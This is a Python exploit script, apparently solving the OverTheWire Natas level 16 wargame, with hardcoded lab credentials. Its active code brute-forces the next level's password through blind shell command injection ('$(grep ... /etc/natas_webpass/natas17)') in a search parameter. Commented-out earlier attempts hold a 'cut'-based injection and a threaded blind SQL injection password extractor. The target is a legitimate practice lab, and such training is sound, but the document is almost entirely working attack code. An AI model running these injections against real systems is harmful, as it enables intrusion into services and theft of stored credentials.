# import requests
# from requests.auth import HTTPBasicAuth
# from concurrent.futures import ThreadPoolExecutor, as_completed

# import requests
# from bs4 import BeautifulSoup


# def find_letter(text):
#     print(text)
#     if text == "":
#         return ""
#     for letter in text[0]: 
#         for word in text:
#             if letter not in word:
#                 break
#     return letter

# def get_content(Data):
#     response = requests.post(url, auth=HTTPBasicAuth(username, password), data=Data)
    
#     # Parse the HTML content using BeautifulSoup
#     soup = BeautifulSoup(response.content, "html.parser")

#     # Find all <pre> tags (or use find() to get only the first one)
#     pre_tags = soup.find_all("pre")

#     words = pre_tags[0].get_text().split()
#     return words

# username = "natas16"
# password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
# url = 'http://natas16.natas.labs.overthewire.org/index.php'

# passwd = ""
# n = 0
# while len(passwd) != 32:
#     n += 1

#     Data = {"needle": f"$(cut -c {n} /etc/natas_webpass/natas17)"}
#     words = get_content(Data)
#     # Clean the output by stripping whitespace and filtering out empty lines

#     if not words:
        
#         # find the number, 
#         number = " "
#         Data = {"needle": f"$(cut -c {n} /etc/natas_webpass/natas17)"}
#         words = get_content(Data)
    
#         passwd += number
#     # case 2: letter
#     else:
#         letter = find_letter(words)
#         # check if is capital letter, by sending the letter -\+ something
#         # if 
#             # if so, then add the capital letter
#             #  passwd += # big letter
#         # else
#             #  passwd += letter
#         passwd += letter
#     print(passwd)

# print(f"the password is: {passwd}")

# # # Define the worker function
# # def check_char(char):
# #     Data = {"username": f"natas16\" and password COLLATE utf8mb4_bin LIKE \'%{char}%\'\""}
# #     try:
# #         response = requests.post(url, auth=HTTPBasicAuth(username, password), data=Data)
# #         if "exists" in response.text:
# #             return char, True
# #         else:
# #             return char, False
# #     except Exception as e:
# #         print(f"An error occurred: {e}")
# #         return char, False

# # def check_pass(passwd):
# #     Data = {"username": f"natas16\" and password COLLATE utf8mb4_bin LIKE \'{passwd}%\'\""}
# #     try:
# #         response = requests.post(url, auth=HTTPBasicAuth(username, password), data=Data)
# #         if "exists" in response.text:
# #             return True
# #         else:
# #             return False
# #     except Exception as e:
# #         print(f"An error occurred: {e}")
# #         return False

# # # Create a thread pool and submit tasks
# # def main():
# #     chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
# #     filtered = ""
# #     with ThreadPoolExecutor(max_workers=10) as executor:
# #         # Submit all tasks
# #         futures = [executor.submit(check_char, char) for char in chars]
        
# #         # Collect results as they complete
# #         for future in as_completed(futures):
# #             char, exists = future.result()
# #             if exists:
# #                 print(char)
# #                 filtered += char
# #     print("start working on password")

# #     passwd = ""
# #     while len(passwd)!=32:
# #     # Submit all tasks
# #         for char in filtered:
# #             if check_pass(passwd+char):
# #                 passwd += char
# #                 break
        
# #         print(f"current passwd: {passwd} ")

# # if __name__ == "__main__":
# #     main()
import requests,string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

characters = ''.join([string.ascii_letters,string.digits])

password = "EqjHJbo7LFNb8vwhHb9s75hokh5".split()
for i in range(1,8):
    for char in characters:
        uri = "{0}?needle=$(grep -E ^{1}{2} /etc/natas_webpass/natas17)African".format(url,''.join(password),char)
        r = requests.post(uri, auth=(auth_username,auth_password))
        print(r.text)
        if 'African' not in r.text:     
            password.append(char)
            print(''.join(password))
            break
        else: continue